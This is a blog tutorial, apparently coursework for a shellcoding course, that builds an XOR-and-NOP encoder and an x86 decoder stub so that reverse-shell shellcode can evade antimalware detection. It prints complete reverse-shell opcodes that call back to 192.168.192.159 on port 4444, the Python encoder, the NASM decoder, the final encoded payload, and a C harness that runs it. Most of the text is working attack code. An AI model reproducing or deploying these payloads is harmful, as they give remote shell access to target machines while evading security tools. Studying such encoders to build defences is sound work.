---                                                                                                                                                                                                                                       
title: Custom Encoder
author: Stipe Marinovic
date: 2020-06-10 22:00:00 +0800                                                                                                                                                                                                           
categories: [Blogging, Tutorial]                                                                                                                                                                                                          
tags: [slae, shellcoding]                                                                                                                                                                                                                 
toc: true                                                                                                                                                                                                                                 
---                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                          
** PAGE STILL UNDER CONSTRUCTION **   
## Introduction ##

Sending well known shell code to target machine would most probably be detected by antimalware solution . 
One way to bypass antimalware detection is to encode shell code and to have higher chances for sucessful bypass, custom encoder should be created and used.  
In this blog post we will go thru process of creating simple encoder and decored. 
As an example we will preform XOR operation on every shell code byte with value ```0x0F``` (encoding key) and add NOP (```\x90```) instrunction after every encoded shell code byte. 
This endocer will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
During decoding procedure, XOR operation will be preformed to restore original shell code and NOP instructions will be ignored.  

## Shell code ##

We can use reverse shell code and wrapper form previous [blog post](https://smarinovic.github.io/posts/Reverse-shell/) which tries to establish connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 

```
python wrapper.py 192.168.192.159 4444
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

## Encoder ##

Once we get opcodes for encoded shell code, we will use following python script to read thru defined bytearray (shell code opcodes) and preform XOR operation with ```0x0F``` key. 
After XOR opration, NOP (```\x90```) will be injected after every encoded byte. 
```
#!/usr/bin/python
import sys
import  random

# Custom reverse shell opcode (connect to 192.168.192.159 at port 4444)
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Encoder: XOR every byte with 0x0F and then insert x90

enc_shellcode=""                 # declare empty string

for x in bytearray(shellcode):   # for every byte in bytearray
   x=x^0x0f                      # preform XOR byte with 0x0F
   enc_shellcode+='0x%02x,'%x    # write encoded byte in new string
   enc_shellcode+='0x90,'        # add NOP (\x90) after every encoded byte in new string

# Print encoded opcode
print 'Encoded shellcode: ' + enc_shellcode
```
Encoded shell code is following:
```
python encoder.py 
Encoded shellcode: 0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0x3e,0x90,0xdd,0x90,0x3e,0x90,0xf9,0x90,0x69,0x90,0xb7,0x90,0x68,0x90,0x0e,0x90,0xbc,0x90,0x0d,0x90,0xbe,0x90,0x0e,0x90,0xbd,0x90,0x09,0x90,0xc2,0x90,0x8f,0x90,0x86,0x90,0xc8,0x90,0x3e,0x90,0xcf,0x90,0x69,0x90,0xb7,0x90,0x65,0x90,0x0e,0x90,0x3e,0x90,0xc6,0x90,0x5e,0x90,0x67,0x90,0xcf,0x90,0xa7,0x90,0xcf,0x90,0x90,0x90,0x69,0x90,0x67,0x90,0x1e,0x90,0x53,0x90,0x69,0x90,0x65,0x90,0x0d,0x90,0x86,0x90,0xf4,0x90,0x86,0x90,0xee,0x90,0xbd,0x90,0x19,0x90,0xc2,0x90,0x8f,0x90,0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0xbe,0x90,0x0c,0x90,0x3e,0x90,0xcf,0x90,0xbf,0x90,0x30,0x90,0x86,0x90,0xf4,0x90,0xf1,0x90,0xc6,0x90,0xc2,0x90,0x8f,0x90,0x7a,0x90,0xfb,0x90,0x3e,0x90,0xcf,0x90,0x5f,0x90,0x67,0x90,0x61,0x90,0x20,0x90,0x7c,0x90,0x67,0x90,0x67,0x90,0x20,0x90,0x20,0x90,0x6d,0x90,0x66,0x90,0x86,0x90,0xec,0x90,0x5f,0x90,0x86,0x90,0xed,0x90,0x5c,0x90,0x86,0x90,0xee,0x90,0xbf,0x90,0x04,0x90,0xc2,0x90,0x8f,0x90,
```

## Decoder ##

To sucessfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with previously defined key ```0x0F```. 
Every other byte will be skipped as it is NOP (```0x90```) instrunction. We will use following registers for decoding: 
* EAX for XOR operations
* ECX as counter for decoding stub
* EDX as pointer to beggining of encoded (and later decoded) shell code
* ESI as pointer to byte which we need to decode
* EDI as pointer to memory address where decoded byte will be placed overwriting original byte

Stub will overwrite original encoded shell code with decoded one, but since we will skip every other byte (\x90) we will have some "garbage" left on the stack. Since running our shell code is primary goal we won't bother with garbage code at this point in time.

```
global _start

section .text
_start:
    jmp short call_decoder

    decode:
        pop esi                  ; pop pointer to shellcode in ESI
        xor eax, eax             ; clear EAX - used for XOR operations
        xor ecx, ecx             ; clear EXC - used as counter
        xor edi, edi             ; clear EDI - used as pointer to decoded shell code destination
        mov cl, len              ; move length of the shellcode in cl
        sar cl, 1                ; divide by 2 (since we are skipping every 2nd byte which is \x90)
        mov edx, esi             ; save pointer to beggining of shellcode from ESI to EDX
        mov edi, esi             ; save pointer to beggining of shellcode from ESI to EDI

    decoder_loop:
        mov  al, byte [esi]      ; move one byte from address pointed by ESI
        xor byte al, 0x0f        ; XOR first byte of the shellcode with 0x0f
        mov [edi], al            ; move new value from AL to address pointed by ESI

        inc esi                  ; increment ESI (to get to new address)
        inc esi                  ; increment ESI (to skip \x90 - NOP)
        inc edi                  ; increment EDI - pointer to decoded shellcode

        dec ecx                  ; decrement ECX (counter) by 1
        cmp cl, 0x1              ; compare if CL is eaqual to 1 and is so - jump to shellcode pointed by EDX
        jnz decoder_loop
        jmp edx

    call_decoder:
        call decode
        shellcode: db 0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0x3e,0x90,0xdd,0x90,0x3e,0x90,0xf9,0x90,0x69,0x90,0xb7,0x90,0x68,0x90,0x0e,0x90,0xbc,0x90,0x0d,0x90,0xbe,0x90,0x0e,0x90,0xbd,0x90,0x09,0x90,0xc2,0x90,0x8f,0x90,0x86,0x90,0xc8,0x90,0x3e,0x90,0xcf,0x90,0x69,0x90,0xb7,0x90,0x65,0x90,0x0e,0x90,0x3e,0x90,0xc6,0x90,0x5e,0x90,0x67,0x90,0xcf,0x90,0xa7,0x90,0xcf,0x90,0x90,0x90,0x69,0x90,0x67,0x90,0x1e,0x90,0x53,0x90,0x69,0x90,0x65,0x90,0x0d,0x90,0x86,0x90,0xf4,0x90,0x86,0x90,0xee,0x90,0xbd,0x90,0x19,0x90,0xc2,0x90,0x8f,0x90,0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0xbe,0x90,0x0c,0x90,0x3e,0x90,0xcf,0x90,0xbf,0x90,0x30,0x90,0x86,0x90,0xf4,0x90,0xf1,0x90,0xc6,0x90,0xc2,0x90,0x8f,0x90,0x7a,0x90,0xfb,0x90,0x3e,0x90,0xcf,0x90,0x5f,0x90,0x67,0x90,0x61,0x90,0x20,0x90,0x7c,0x90,0x67,0x90,0x67,0x90,0x20,0x90,0x20,0x90,0x6d,0x90,0x66,0x90,0x86,0x90,0xec,0x90,0x5f,0x90,0x86,0x90,0xed,0x90,0x5c,0x90,0x86,0x90,0xee,0x90,0xbf,0x90,0x04,0x90,0xc2,0x90,0x8f,0x90
        len equ $-shellcode

```

Assembly code needs to be compiled and linked in the usual way.. 
```
nasm -f elf32 -o decoder.o decoder.nasm
ld -z execstack -o decoder decoder.o
```

But to get opcode we need to modify the usual objdump/cut command as output has more that 6 columns, so instead of ```cut -f1-6``` we need to use ```cut -f1-7``` as follows:

```
objdump -d $1 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

With modified command, extracted opcode is following:
```
"\xeb\x20\x5e\x31\xc0\x31\xc9\x31\xff\xb1\xc4\xd0\xf9\x89\xf2\x89\xf7\x8a\x06\x34\x0f\x88\x07\x46\x46\x47\x49\x80\xf9\x01\x75\xf1\xff\xe2\xe8\xdb\xff\xff\xff\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\x3e\x90\xdd\x90\x3e\x90\xf9\x90\x69\x90\xb7\x90\x68\x90\x0e\x90\xbc\x90\x0d\x90\xbe\x90\x0e\x90\xbd\x90\x09\x90\xc2\x90\x8f\x90\x86\x90\xc8\x90\x3e\x90\xcf\x90\x69\x90\xb7\x90\x65\x90\x0e\x90\x3e\x90\xc6\x90\x5e\x90\x67\x90\xcf\x90\xa7\x90\xcf\x90\x90\x90\x69\x90\x67\x90\x1e\x90\x53\x90\x69\x90\x65\x90\x0d\x90\x86\x90\xf4\x90\x86\x90\xee\x90\xbd\x90\x19\x90\xc2\x90\x8f\x90\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\xbe\x90\x0c\x90\x3e\x90\xcf\x90\xbf\x90\x30\x90\x86\x90\xf4\x90\xf1\x90\xc6\x90\xc2\x90\x8f\x90\x7a\x90\xfb\x90\x3e\x90\xcf\x90\x5f\x90\x67\x90\x61\x90\x20\x90\x7c\x90\x67\x90\x67\x90\x20\x90\x20\x90\x6d\x90\x66\x90\x86\x90\xec\x90\x5f\x90\x86\x90\xed\x90\x5c\x90\x86\x90\xee\x90\xbf\x90\x04\x90\xc2\x90\x8f\x90"
```

## Seeing decoder in action ##

Next, we can use skeleton code to run and test sucessfull decoding. To compile it following command should be used:

```
gcc -fno-stack-protector -z execstack -m32 skeleton.c -o encoded_revshell -g
```

Skeleton file with encoded shell code:

```
#include <stdio.h>

unsigned char shellcode[] = "\xeb\x20\x5e\x31\xc0\x31\xc9\x31\xff\xb1\xc4\xd0\xf9\x89\xf2\x89\xf7\x8a\x06\x34\x0f\x88\x07\x46\x46\x47\x49\x80\xf9\x01\x75\xf1\xff\xe2\xe8\xdb\xff\xff\xff\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\x3e\x90\xdd\x90\x3e\x90\xf9\x90\x69\x90\xb7\x90\x68\x90\x0e\x90\xbc\x90\x0d\x90\xbe\x90\x0e\x90\xbd\x90\x09\x90\xc2\x90\x8f\x90\x86\x90\xc8\x90\x3e\x90\xcf\x90\x69\x90\xb7\x90\x65\x90\x0e\x90\x3e\x90\xc6\x90\x5e\x90\x67\x90\xcf\x90\xa7\x90\xcf\x90\x90\x90\x69\x90\x67\x90\x1e\x90\x53\x90\x69\x90\x65\x90\x0d\x90\x86\x90\xf4\x90\x86\x90\xee\x90\xbd\x90\x19\x90\xc2\x90\x8f\x90\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\xbe\x90\x0c\x90\x3e\x90\xcf\x90\xbf\x90\x30\x90\x86\x90\xf4\x90\xf1\x90\xc6\x90\xc2\x90\x8f\x90\x7a\x90\xfb\x90\x3e\x90\xcf\x90\x5f\x90\x67\x90\x61\x90\x20\x90\x7c\x90\x67\x90\x67\x90\x20\x90\x20\x90\x6d\x90\x66\x90\x86\x90\xec\x90\x5f\x90\x86\x90\xed\x90\x5c\x90\x86\x90\xee\x90\xbf\x90\x04\x90\xc2\x90\x8f\x90";

int main()
{
        int (*ret)() = (int(*)())shellcode;
        printf("Size of shellcode: %d bytes.\n", sizeof(shellcode)); 
        ret();
}
```

By stepping thu program with GDB we can observe shell code decoding. ESI register is used for storing pointer to beggining of encoded shellcode.  
At the beggining of decoding stub we can see that ESI register is pointing to the beggining of encoded shellcode which is located at memory address: ```0x404067```. 

```
gdb-peda$ info register esi
esi            0x404067            0x404067
```

So in order to observe decoing, we will monitor first 10 bytes starting at ```0x404067``` memory address.
Before decoding starts we can see that memory address ```0x404067``` contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)

* Initial data on address ```0x404067```  

```
gdb-peda$ x/10b 0x404067
0x404067 <shellcode+39>:        0x3e    0x90    0xcf    0x90    0x3e    0x90    0xd4    0x90
0x40406f <shellcode+47>:        0x3e    0x90
```

* content of the same address after few itterations:  
We can see that ```0x3e``` is decoded to ```0x31``` (which is result of following instruction ```XOR 0x0F, 0x3e```) and ```0x90``` is ignored and overwritten.

```
gdb-peda$ x/10b 0x404067
0x404067 <shellcode+39>:        0x31    0xc0    0x31    0xdb    0x31    0x90    0xd4    0x90
 decoded 1st opcode ------------^^^^
 NOP is replaced with 2nd opcode -------^^^^
 decoded 3rd opcode ----------------------------^^^^
 etc.
```

* content of the same address after some more itterations:  
We can see that decoded shell code does not contain added NOPs (```0x90```) and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.). Decoded opcodes overwrites original encoded opcodes:
```
gdb-peda$ x/10b 0x404067
0x404067 <shellcode+39>:        0x31    0xc0    0x31    0xdb    0x31    0xc9    0x31    0xd2
0x40406f <shellcode+47>:        0x31    0xf6
```

Reverse shell is sucessfuly established once decoding is finished as show on following scren shot.

![Custom decoder working](https://smarinovic.github.io/assets/img/slae_00018.png)
